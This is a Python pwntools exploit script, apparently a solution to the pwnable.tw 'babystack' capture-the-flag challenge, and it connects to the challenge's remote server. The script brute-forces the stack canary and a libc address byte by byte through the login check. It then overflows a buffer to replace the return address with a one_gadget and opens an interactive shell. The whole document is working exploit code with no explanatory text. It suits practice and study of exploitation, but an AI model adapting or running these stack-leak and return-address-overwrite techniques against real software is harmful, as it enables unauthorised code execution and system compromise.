from pwn import *

def leak_stack(len):
    leak = ''
    for i in range(len):
        for j in range(1, 256):
            p.recvuntil(b'>> ')
            p.sendline(b'1')
            p.recvuntil(b':')
            p.send(leak + chr(j) + '\x00')
            if b'Success' in p.recvline():
                leak += chr(j)
                p.recvuntil(b'>> ')
                p.sendline(b'1')
                break
    return leak

def login(password):
    p.recvuntil(b'>> ')
    p.sendline(b'1')
    p.recvuntil(b':')
    p.send(password)

def logout():
    p.recvuntil(b'>> ')
    p.sendline(b'1')

def exit():
    p.recvuntil(b'>> ')
    p.sendline(b'2')

def copy(data):
    p.recvuntil(b'>> ')
    p.sendline(b'3')
    p.recvuntil(b':')
    p.send(data)

def s2b(s):
    return bytes([ord(c) for c in s])

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = remote('chall.pwnable.tw', 10205)
#p = process('./babystack')
elf = ELF('./babystack')
libc = ELF('./libc_64.so.6')

canary = s2b(leak_stack(0x10))
login(b'\x00' + b'a' * 0x57)
copy(b'b' * 0x10)
logout()
libc_base = u64(s2b(leak_stack(0x20)[-6:] + '\x00' * 0x2)) - libc.symbols['setvbuf'] - 324
print('libc base:', hex(libc_base))

one_gadget = libc_base + 0xf0567
login(b'\x00' + b'a' * 0x3f + canary + b'a' * 0x18 + p64(one_gadget))
copy(b'a' * 0x10)
exit()

p.interactive()
